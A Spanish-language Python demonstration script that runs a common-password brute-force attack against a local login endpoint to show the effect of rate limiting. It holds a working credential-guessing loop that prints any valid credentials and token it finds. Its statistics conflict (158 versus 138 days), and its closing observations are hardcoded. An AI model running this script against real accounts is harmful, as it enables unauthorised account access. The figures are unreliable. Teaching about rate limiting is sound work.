#!/usr/bin/env python3
"""
🔴 ATAQUE 1: Brute Force Login (Sin Rate Limiting)

Demuestra cómo un atacante puede probar múltiples contraseñas sin límites
cuando NO hay rate limiting implementado.

ANTES: Sin protección - puede hacer miles de intentos
DESPUÉS: Con rate limiting - bloqueado después de 5 intentos
"""

import requests
import time
from datetime import datetime

# Configuración
BASE_URL = "http://localhost:8000"
LOGIN_ENDPOINT = f"{BASE_URL}/login"

# Lista de contraseñas comunes a probar
COMMON_PASSWORDS = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop"
]

def attempt_login(email: str, password: str) -> dict:
    """Intenta hacer login con credenciales dadas"""
    try:
        response = requests.post(
            LOGIN_ENDPOINT,
            json={"email": email, "password": password},
            timeout=5
        )
        return {
            "status_code": response.status_code,
            "response": response.json() if response.headers.get('content-type') == 'application/json' else response.text,
            "success": response.status_code == 200
        }
    except Exception as e:
        return {
            "status_code": None,
            "response": str(e),
            "success": False
        }

def brute_force_attack(target_email: str, password_list: list, delay: float = 0.1):
    """
    Ejecuta ataque de fuerza bruta
    
    Args:
        target_email: Email del usuario objetivo
        password_list: Lista de contraseñas a probar
        delay: Delay entre intentos (segundos)
    """
    print("\n" + "="*70)
    print("🔴 INICIANDO ATAQUE DE FUERZA BRUTA")
    print("="*70)
    print(f"Objetivo: {target_email}")
    print(f"Contraseñas a probar: {len(password_list)}")
    print(f"Delay entre intentos: {delay}s")
    print("="*70 + "\n")
    
    attempts = 0
    blocked = False
    start_time = time.time()
    
    for password in password_list:
        attempts += 1
        
        print(f"[{attempts:02d}] Probando: '{password}'...", end=" ")
        
        result = attempt_login(target_email, password)
        
        # Verificar si fuimos bloqueados por rate limiting
        if result["status_code"] == 429:
            print("❌ BLOQUEADO - Rate Limit Alcanzado!")
            blocked = True
            break
        elif result["success"]:
            elapsed = time.time() - start_time
            print(f"✅ ÉXITO! Contraseña encontrada en {elapsed:.2f}s")
            print(f"\n🎯 Credenciales válidas:")
            print(f"   Email: {target_email}")
            print(f"   Password: {password}")
            print(f"   Token: {result['response'].get('token', 'N/A')[:50]}...")
            return True
        else:
            print(f"❌ Falló ({result['status_code']})")
        
        time.sleep(delay)
    
    elapsed = time.time() - start_time
    
    print("\n" + "="*70)
    if blocked:
        print("🛡️ ATAQUE BLOQUEADO POR RATE LIMITING")
        print(f"   Intentos realizados: {attempts}")
        print(f"   Tiempo transcurrido: {elapsed:.2f}s")
        print(f"   ✅ PROTECCIÓN FUNCIONANDO CORRECTAMENTE")
    else:
        print("❌ ATAQUE COMPLETADO (Sin contraseña encontrada)")
        print(f"   Intentos totales: {attempts}")
        print(f"   Tiempo total: {elapsed:.2f}s")
    print("="*70 + "\n")
    
    return False

def demo_sin_proteccion():
    """
    Demostración: Qué pasaría SIN rate limiting
    
    En un sistema sin protección, el atacante podría:
    - Probar 1000+ contraseñas por minuto
    - Usar diccionarios de millones de contraseñas
    - Ejecutar ataques distribuidos desde múltiples IPs
    """
    print("\n" + "🔴"*35)
    print("ESCENARIO 1: SIN RATE LIMITING")
    print("🔴"*35)
    print("""
⚠️  En un sistema SIN protección:
    - Se pueden hacer infinitos intentos sin penalización
    - Un atacante con diccionario de 1M de contraseñas
      puede probarlas todas en ~17 minutos (1000/min)
    - Ataques distribuidos desde múltiples IPs
    - Probabilidad de éxito: ALTA para contraseñas comunes
    """)

def demo_con_proteccion(target_email: str = "test@test.com"):
    """
    Demostración: Con rate limiting implementado
    
    El sistema permite máximo 5 intentos por minuto por IP.
    El atacante será bloqueado rápidamente.
    """
    print("\n" + "🛡️"*35)
    print("ESCENARIO 2: CON RATE LIMITING (5 intentos/min)")
    print("🛡️"*35)
    print("""
✅ Con protección implementada:
   - Máximo 5 intentos por minuto por IP
   - Bloqueo temporal después del límite
   - Atacante necesitaría cambiar de IP constantemente
   - Probabilidad de éxito: MUY BAJA
   - Tiempo para probar 1M contraseñas: ~3,800 horas = 158 días
    """)
    
    # Ejecutar ataque real
    print("Ejecutando ataque real contra sistema protegido...\n")
    brute_force_attack(target_email, COMMON_PASSWORDS[:10], delay=0.5)

def demo_comparacion():
    """Tabla comparativa de impacto"""
    print("\n" + "="*70)
    print("📊 COMPARACIÓN DE IMPACTO")
    print("="*70)
    print(f"{'Métrica':<30} | {'Sin Protección':<18} | {'Con Protección':<18}")
    print("-"*70)
    print(f"{'Intentos por minuto':<30} | {'Ilimitado':<18} | {'5':<18}")
    print(f"{'Tiempo para 1000 passwords':<30} | {'1 minuto':<18} | {'3.3 horas':<18}")
    print(f"{'Tiempo para 1M passwords':<30} | {'17 minutos':<18} | {'138 días':<18}")
    print(f"{'Probabilidad de éxito':<30} | {'Alta (80%+)':<18} | {'Muy Baja (<5%)':<18}")
    print(f"{'Detectable':<30} | {'No':<18} | {'Sí (logs)':<18}")
    print(f"{'Bloqueble':<30} | {'No':<18} | {'Sí (IP ban)':<18}")
    print("="*70)

if __name__ == "__main__":
    print("\n" + "🎓"*35)
    print("DEMOSTRACIÓN: ATAQUE DE FUERZA BRUTA Y RATE LIMITING")
    print("🎓"*35)
    print("""
Este script demuestra:
1. Cómo funciona un ataque de fuerza bruta
2. El impacto del rate limiting en la seguridad
3. Comparación cuantitativa antes/después

⚠️  IMPORTANTE: Solo usar en entornos de prueba propios
    """)
    
    # Mostrar escenarios teóricos
    demo_sin_proteccion()
    
    # Usuario existente de prueba (si existe en tu BD)
    # Cambia esto por un email que tengas en tu base de datos
    TARGET_EMAIL = input("\nIngresa email de prueba (o presiona Enter para 'test@test.com'): ").strip()
    if not TARGET_EMAIL:
        TARGET_EMAIL = "test@test.com"
    
    # Demo con protección REAL
    demo_con_proteccion(TARGET_EMAIL)
    
    # Tabla comparativa
    demo_comparacion()
    
    print("\n✅ Demostración completada")
    print("📝 Observaciones:")
    print("   - El rate limiting bloqueó el ataque después de 5 intentos")
    print("   - Sin rate limiting, se podrían probar 1000+ contraseñas/minuto")
    print("   - La protección reduce la probabilidad de éxito en >95%")
